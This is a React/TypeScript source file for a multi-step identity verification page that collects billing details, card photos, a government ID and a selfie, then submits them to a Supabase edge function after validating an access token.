import React, { useState, useEffect } from 'react';
import { useParams } from 'react-router-dom';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Progress } from '@/components/ui/progress';
import { Shield, Upload, Camera, CheckCircle, AlertTriangle, CreditCard, User, FileText, Mail } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';

const SUPABASE_URL = "https://ohfkcxwwvksrjymkgloo.supabase.co";
const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9oZmtjeHd3dmtzcmp5bWtnbG9vIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTAxMDk2MjgsImV4cCI6MjA2NTY4NTYyOH0.c-kSgAyWyiqbJ1m-binRf23l7P-cAT7AEP_sxGYHMpY";

const TOKEN_REGEX = /^[a-f0-9]{64}$/i;

function isValidKycToken(token: string | undefined): token is string {
  if (!token) return false;
  if (token === ':token' || token === 'token') return false;
  return TOKEN_REGEX.test(token);
}

const KYCVerificationPage = () => {
  const { token } = useParams<{ token: string }>();
  const { toast } = useToast();
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(true);
  const [submitting, setSubmitting] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [invalidToken, setInvalidToken] = useState(false);

  // Step 1: Billing info
  const [billingName, setBillingName] = useState('');
  const [billingStreet, setBillingStreet] = useState('');
  const [billingCity, setBillingCity] = useState('');
  const [billingState, setBillingState] = useState('');
  const [billingZip, setBillingZip] = useState('');
  const [billingCountry, setBillingCountry] = useState('US');

  // Step 2-4: Files
  const [cardFront, setCardFront] = useState<File | null>(null);
  const [cardBack, setCardBack] = useState<File | null>(null);
  const [idDocument, setIdDocument] = useState<File | null>(null);
  const [selfie, setSelfie] = useState<File | null>(null);

  // File preview URLs
  const [previews, setPreviews] = useState<Record<string, string>>({});

  useEffect(() => {
    // Validate token format before making any network call
    if (!isValidKycToken(token)) {
      setInvalidToken(true);
      setLoading(false);
      return;
    }

    fetch(`${SUPABASE_URL}/functions/v1/submit-kyc`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'apikey': SUPABASE_ANON_KEY },
      body: JSON.stringify({ action: 'verify-token', token }),
    })
      .then(async (res) => {
        const data = await res.json();
        if (data.valid === false) {
          if (data.reason === 'already_submitted') {
            setSubmitted(true);
          } else {
            setError(data.message || 'Invalid or expired verification link');
          }
        } else if (!res.ok) {
          setError(data.error || 'Invalid verification link');
        }
        setLoading(false);
      })
      .catch(() => {
        setError('Unable to verify link. Please try again.');
        setLoading(false);
      });
  }, [token]);

  const handleFileChange = (setter: (f: File | null) => void, key: string) => (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0] || null;
    if (file) {
      if (file.size > 10 * 1024 * 1024) {
        toast({ title: 'File too large', description: 'Maximum file size is 10MB', variant: 'destructive' });
        return;
      }
      if (!['image/jpeg', 'image/png', 'image/webp'].includes(file.type)) {
        toast({ title: 'Invalid file type', description: 'Please upload JPEG, PNG, or WebP', variant: 'destructive' });
        return;
      }
      setter(file);
      const url = URL.createObjectURL(file);
      setPreviews(prev => ({ ...prev, [key]: url }));
    }
  };

  const canProceed = () => {
    switch (step) {
      case 1: return billingName && billingStreet && billingCity && billingState && billingZip && billingCountry;
      case 2: return !!cardFront && !!cardBack;
      case 3: return !!idDocument;
      case 4: return !!selfie;
      default: return false;
    }
  };

  const handleSubmit = async () => {
    if (!isValidKycToken(token) || !cardFront || !cardBack || !idDocument || !selfie) return;
    setSubmitting(true);

    try {
      const formData = new FormData();
      formData.append('token', token);
      formData.append('billing_name', billingName);
      formData.append('billing_street', billingStreet);
      formData.append('billing_city', billingCity);
      formData.append('billing_state', billingState);
      formData.append('billing_zip', billingZip);
      formData.append('billing_country', billingCountry);
      formData.append('card_front', cardFront);
      formData.append('card_back', cardBack);
      formData.append('id_document', idDocument);
      formData.append('selfie', selfie);

      const res = await fetch(`${SUPABASE_URL}/functions/v1/submit-kyc`, {
        method: 'POST',
        headers: { 'apikey': SUPABASE_ANON_KEY },
        body: formData,
      });

      const result = await res.json();

      if (!res.ok) {
        throw new Error(result.error || 'Submission failed');
      }

      setSubmitted(true);
      toast({ title: 'Verification submitted!', description: 'We will review your documents shortly.' });
    } catch (err: any) {
      toast({ title: 'Submission failed', description: err.message, variant: 'destructive' });
    } finally {
      setSubmitting(false);
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 flex items-center justify-center">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-cyan-400"></div>
      </div>
    );
  }

  // Invalid or placeholder token — show friendly message without calling edge function
  if (invalidToken) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 py-16">
        <div className="container mx-auto px-4 max-w-lg">
          <Card className="bg-slate-800/80 border-amber-500/30">
            <CardContent className="py-12 text-center">
              <Mail className="h-16 w-16 text-amber-400 mx-auto mb-4" />
              <h2 className="text-2xl font-bold text-white mb-2">Invalid Verification Link</h2>
              <p className="text-gray-300 mb-4">
                This link is not a valid KYC verification link. Please use the full link from the verification email sent to you.
              </p>
              <div className="bg-slate-700/50 rounded-lg p-4 text-left">
                <p className="text-gray-400 text-sm">
                  <strong className="text-gray-200">Need help?</strong>
                </p>
                <ul className="text-gray-400 text-sm mt-2 space-y-1">
                  <li>• Check your email for the KYC verification link</li>
                  <li>• Contact support if you haven't received an email</li>
                  <li>• Request a new verification email from customer support</li>
                </ul>
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 py-16">
        <div className="container mx-auto px-4 max-w-lg">
          <Card className="bg-slate-800/80 border-red-500/30">
            <CardContent className="py-12 text-center">
              <AlertTriangle className="h-16 w-16 text-red-400 mx-auto mb-4" />
              <h2 className="text-2xl font-bold text-white mb-2">Verification Error</h2>
              <p className="text-gray-300 mb-4">{error}</p>
              <div className="bg-slate-700/50 rounded-lg p-4 text-left">
                <p className="text-gray-400 text-sm">
                  <strong className="text-gray-200">What to do:</strong>
                </p>
                <ul className="text-gray-400 text-sm mt-2 space-y-1">
                  <li>• This link may have expired or already been used</li>
                  <li>• Contact support to request a new verification email</li>
                </ul>
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    );
  }

  if (submitted) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 py-16">
        <div className="container mx-auto px-4 max-w-lg">
          <Card className="bg-slate-800/80 border-green-500/30">
            <CardContent className="py-12 text-center">
              <CheckCircle className="h-16 w-16 text-green-400 mx-auto mb-4" />
              <h2 className="text-2xl font-bold text-white mb-2">Verification Submitted</h2>
              <p className="text-gray-300">Your documents have been submitted for review. We'll email you once verification is complete.</p>
            </CardContent>
          </Card>
        </div>
      </div>
    );
  }

  const steps = [
    { num: 1, label: 'Billing Info', icon: User },
    { num: 2, label: 'Card Photos', icon: CreditCard },
    { num: 3, label: 'Government ID', icon: FileText },
    { num: 4, label: 'Selfie', icon: Camera },
  ];

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 py-8 md:py-16">
      <div className="container mx-auto px-4 max-w-2xl">
        {/* Header */}
        <div className="text-center mb-8">
          <div className="inline-flex items-center gap-2 bg-amber-900/30 border border-amber-500/50 rounded-full px-4 py-2 mb-4">
            <Shield className="h-4 w-4 text-amber-400" />
            <span className="text-amber-200 text-sm font-medium">Secure Identity Verification</span>
          </div>
          <h1 className="text-3xl font-bold text-white">Verify Your Identity</h1>
          <p className="text-gray-400 mt-2">Complete these steps to process your order securely</p>
        </div>

        {/* Progress Steps */}
        <div className="flex items-center justify-between mb-8 px-4">
          {steps.map((s, i) => (
            <React.Fragment key={s.num}>
              <div className="flex flex-col items-center">
                <div className={`w-10 h-10 rounded-full flex items-center justify-center ${
                  step > s.num ? 'bg-green-600' : step === s.num ? 'bg-cyan-600' : 'bg-slate-700'
                }`}>
                  {step > s.num ? <CheckCircle className="h-5 w-5 text-white" /> : <s.icon className="h-5 w-5 text-white" />}
                </div>
                <span className={`text-xs mt-1 ${step >= s.num ? 'text-cyan-300' : 'text-gray-500'}`}>{s.label}</span>
              </div>
              {i < steps.length - 1 && (
                <div className={`flex-1 h-0.5 mx-2 ${step > s.num ? 'bg-green-600' : 'bg-slate-700'}`} />
              )}
            </React.Fragment>
          ))}
        </div>

        <Progress value={(step / 4) * 100} className="mb-6" />

        {/* Step Content */}
        <Card className="bg-slate-800/80 border-cyan-500/20">
          <CardHeader>
            <CardTitle className="text-white">
              {step === 1 && 'Billing Information'}
              {step === 2 && 'Credit Card Photos'}
              {step === 3 && 'Government-Issued ID'}
              {step === 4 && 'Selfie with ID'}
            </CardTitle>
            <CardDescription className="text-gray-400">
              {step === 1 && 'Enter the name and address registered to your credit card'}
              {step === 2 && 'Upload clear photos of your card front and back'}
              {step === 3 && 'Upload a valid government-issued photo ID'}
              {step === 4 && 'Take a selfie clearly holding your ID document'}
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            {step === 1 && (
              <>
                <div>
                  <Label className="text-gray-300">Full Name (as on card) *</Label>
                  <Input value={billingName} onChange={e => setBillingName(e.target.value)} className="bg-slate-700 border-slate-600 text-white" placeholder="John Doe" />
                </div>
                <div>
                  <Label className="text-gray-300">Street Address *</Label>
                  <Input value={billingStreet} onChange={e => setBillingStreet(e.target.value)} className="bg-slate-700 border-slate-600 text-white" placeholder="123 Main St" />
                </div>
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <Label className="text-gray-300">City *</Label>
                    <Input value={billingCity} onChange={e => setBillingCity(e.target.value)} className="bg-slate-700 border-slate-600 text-white" />
                  </div>
                  <div>
                    <Label className="text-gray-300">State/Province *</Label>
                    <Input value={billingState} onChange={e => setBillingState(e.target.value)} className="bg-slate-700 border-slate-600 text-white" />
                  </div>
                </div>
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <Label className="text-gray-300">ZIP/Postal Code *</Label>
                    <Input value={billingZip} onChange={e => setBillingZip(e.target.value)} className="bg-slate-700 border-slate-600 text-white" />
                  </div>
                  <div>
                    <Label className="text-gray-300">Country *</Label>
                    <Input value={billingCountry} onChange={e => setBillingCountry(e.target.value)} className="bg-slate-700 border-slate-600 text-white" />
                  </div>
                </div>
              </>
            )}

            {step === 2 && (
              <div className="space-y-6">
                <div className="bg-amber-900/20 border border-amber-500/30 rounded-lg p-4">
                  <div className="flex items-start gap-2">
                    <AlertTriangle className="h-5 w-5 text-amber-400 mt-0.5" />
                    <p className="text-amber-200 text-sm">You may cover the middle digits of your card number. Only the first 6 and last 4 digits need to be visible.</p>
                  </div>
                </div>
                {[
                  { label: 'Card Front', file: cardFront, setter: setCardFront, key: 'cardFront' },
                  { label: 'Card Back', file: cardBack, setter: setCardBack, key: 'cardBack' },
                ].map(({ label, file, setter, key }) => (
                  <div key={key}>
                    <Label className="text-gray-300 mb-2 block">{label} *</Label>
                    <label className="flex flex-col items-center justify-center border-2 border-dashed border-slate-600 rounded-lg p-6 cursor-pointer hover:border-cyan-500/50 transition-colors">
                      {previews[key] ? (
                        <img src={previews[key]} alt={label} className="max-h-40 rounded-lg mb-2" />
                      ) : (
                        <Upload className="h-8 w-8 text-gray-500 mb-2" />
                      )}
                      <span className="text-sm text-gray-400">{file ? file.name : 'Click to upload or drag & drop'}</span>
                      <input type="file" accept="image/jpeg,image/png,image/webp" className="hidden" onChange={handleFileChange(setter, key)} capture="environment" />
                    </label>
                  </div>
                ))}
              </div>
            )}

            {step === 3 && (
              <div>
                <p className="text-gray-400 text-sm mb-4">Accepted: Passport, Driver's License, or National ID Card</p>
                <Label className="text-gray-300 mb-2 block">ID Document *</Label>
                <label className="flex flex-col items-center justify-center border-2 border-dashed border-slate-600 rounded-lg p-8 cursor-pointer hover:border-cyan-500/50 transition-colors">
                  {previews.idDocument ? (
                    <img src={previews.idDocument} alt="ID Document" className="max-h-48 rounded-lg mb-2" />
                  ) : (
                    <FileText className="h-10 w-10 text-gray-500 mb-2" />
                  )}
                  <span className="text-sm text-gray-400">{idDocument ? idDocument.name : 'Upload your government ID'}</span>
                  <input type="file" accept="image/jpeg,image/png,image/webp" className="hidden" onChange={handleFileChange(setIdDocument, 'idDocument')} capture="environment" />
                </label>
              </div>
            )}

            {step === 4 && (
              <div>
                <div className="bg-blue-900/20 border border-blue-500/30 rounded-lg p-4 mb-4">
                  <p className="text-blue-200 text-sm">Hold your ID next to your face so both are clearly visible in the photo. Make sure the ID text is readable.</p>
                </div>
                <Label className="text-gray-300 mb-2 block">Selfie holding your ID *</Label>
                <label className="flex flex-col items-center justify-center border-2 border-dashed border-slate-600 rounded-lg p-8 cursor-pointer hover:border-cyan-500/50 transition-colors">
                  {previews.selfie ? (
                    <img src={previews.selfie} alt="Selfie" className="max-h-48 rounded-lg mb-2" />
                  ) : (
                    <Camera className="h-10 w-10 text-gray-500 mb-2" />
                  )}
                  <span className="text-sm text-gray-400">{selfie ? selfie.name : 'Take or upload your selfie'}</span>
                  <input type="file" accept="image/jpeg,image/png,image/webp" className="hidden" onChange={handleFileChange(setSelfie, 'selfie')} capture="user" />
                </label>
              </div>
            )}

            {/* Navigation */}
            <div className="flex justify-between pt-4">
              {step > 1 ? (
                <Button variant="outline" onClick={() => setStep(s => s - 1)} className="border-slate-600 text-gray-300">
                  Back
                </Button>
              ) : <div />}

              {step < 4 ? (
                <Button onClick={() => setStep(s => s + 1)} disabled={!canProceed()} className="bg-cyan-600 hover:bg-cyan-700">
                  Continue
                </Button>
              ) : (
                <Button onClick={handleSubmit} disabled={!canProceed() || submitting} className="bg-green-600 hover:bg-green-700">
                  {submitting ? 'Submitting...' : 'Submit Verification'}
                </Button>
              )}
            </div>
          </CardContent>
        </Card>

        <p className="text-center text-gray-500 text-xs mt-6">
          🔒 Your documents are encrypted and stored securely. They are only accessible to authorized personnel for verification purposes.
        </p>
      </div>
    </div>
  );
};

export default KYCVerificationPage;
